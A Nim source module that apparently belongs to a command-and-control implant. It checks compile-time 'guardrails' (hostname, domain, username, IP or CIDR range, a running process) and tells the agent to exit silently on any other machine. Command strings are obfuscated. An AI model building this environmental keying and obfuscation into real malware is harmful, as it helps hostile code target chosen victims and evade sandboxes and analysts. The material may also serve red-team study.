import std/[os, osproc, strutils]
import strenc

when defined(windows):
  import winim/lean

# Compile-time guardrail values from build environment
const
  guardrailHostname = static: getEnv("GUARDRAIL_HOSTNAME", "")
  guardrailDomain = static: getEnv("GUARDRAIL_DOMAIN", "")
  guardrailUsername = static: getEnv("GUARDRAIL_USERNAME", "")
  guardrailIp = static: getEnv("GUARDRAIL_IP", "")
  guardrailProcess = static: getEnv("GUARDRAIL_PROCESS", "")

proc getHostnameStr(): string =
  try:
    when defined(windows):
      result = getEnv(obf("COMPUTERNAME"), "")
    else:
      result = execProcess(obf("hostname")).strip()
  except:
    result = ""

proc getUsernameStr(): string =
  try:
    when defined(windows):
      result = getEnv(obf("USERNAME"), "")
    else:
      result = getEnv(obf("USER"), "")
  except:
    result = ""

proc getDomainStr(): string =
  when defined(windows):
    try:
      result = getEnv(obf("USERDOMAIN"), "")
    except:
      result = ""
  else:
    result = ""

proc getIpAddresses(): seq[string] =
  result = @[]
  try:
    when defined(windows):
      let output = execProcess(obf("ipconfig"))
      for line in output.splitLines():
        if obf("IPv4") in line:
          let parts = line.split(":")
          if parts.len > 1:
            let ip = parts[1].strip()
            if ip.len > 0:
              result.add(ip)
    else:
      let output = execProcess(obf("hostname -I"))
      for ip in output.strip().split(" "):
        if ip.len > 0:
          result.add(ip)
  except:
    discard

proc ipToUint32(ip: string): uint32 =
  ## Convert dotted IP string to uint32
  let parts = ip.split(".")
  if parts.len != 4:
    return 0
  try:
    result = (parts[0].parseUInt.uint32 shl 24) or
             (parts[1].parseUInt.uint32 shl 16) or
             (parts[2].parseUInt.uint32 shl 8) or
             (parts[3].parseUInt.uint32)
  except:
    result = 0

proc ipInCidr(ip: string, cidr: string): bool =
  ## Check if IP is within a CIDR range (e.g. 10.0.0.0/24)
  let parts = cidr.split("/")
  if parts.len != 2:
    return false
  let network = ipToUint32(parts[0])
  let prefixLen = try: parts[1].parseInt except: return false
  if prefixLen < 0 or prefixLen > 32:
    return false
  let mask = if prefixLen == 0: 0'u32 else: (0xFFFFFFFF'u32 shl (32 - prefixLen))
  let ipVal = ipToUint32(ip)
  result = (ipVal and mask) == (network and mask)

proc isProcessRunning(processName: string): bool =
  ## Check if a process with the given name is running
  try:
    when defined(windows):
      let output = execProcess(obf("tasklist /FO CSV /NH"))
      let lowerName = processName.toLowerAscii()
      for line in output.splitLines():
        if line.len > 0:
          # CSV format: "process.exe","1234","Console","1","12,345 K"
          let name = line.split(",")[0].strip(chars = {'"'}).toLowerAscii()
          if name == lowerName:
            return true
    else:
      let output = execProcess(obf("ps -eo comm="))
      let lowerName = processName.toLowerAscii()
      for line in output.splitLines():
        let name = line.strip().toLowerAscii()
        if name == lowerName or name.extractFilename() == lowerName:
          return true
  except:
    discard
  return false

proc checkGuardrails*(): bool =
  ## Check all configured execution guardrails.
  ## Returns true if all guardrails pass (or are disabled).
  ## Returns false if any guardrail fails - agent should exit silently.

  # Hostname check
  when guardrailHostname.len > 0:
    let hostname = getHostnameStr()
    if hostname.toLowerAscii() != guardrailHostname.toLowerAscii():
      return false

  # Domain check
  when guardrailDomain.len > 0:
    let domain = getDomainStr()
    if domain.toLowerAscii() != guardrailDomain.toLowerAscii():
      return false

  # Username check
  when guardrailUsername.len > 0:
    let username = getUsernameStr()
    if username.toLowerAscii() != guardrailUsername.toLowerAscii():
      return false

  # IP address check (supports exact match and CIDR)
  when guardrailIp.len > 0:
    let ips = getIpAddresses()
    var ipMatch = false
    if "/" in guardrailIp:
      # CIDR check
      for ip in ips:
        if ipInCidr(ip, guardrailIp):
          ipMatch = true
          break
    else:
      # Exact match
      for ip in ips:
        if ip == guardrailIp:
          ipMatch = true
          break
    if not ipMatch:
      return false

  # Process check
  when guardrailProcess.len > 0:
    if not isProcessRunning(guardrailProcess):
      return false

  return true
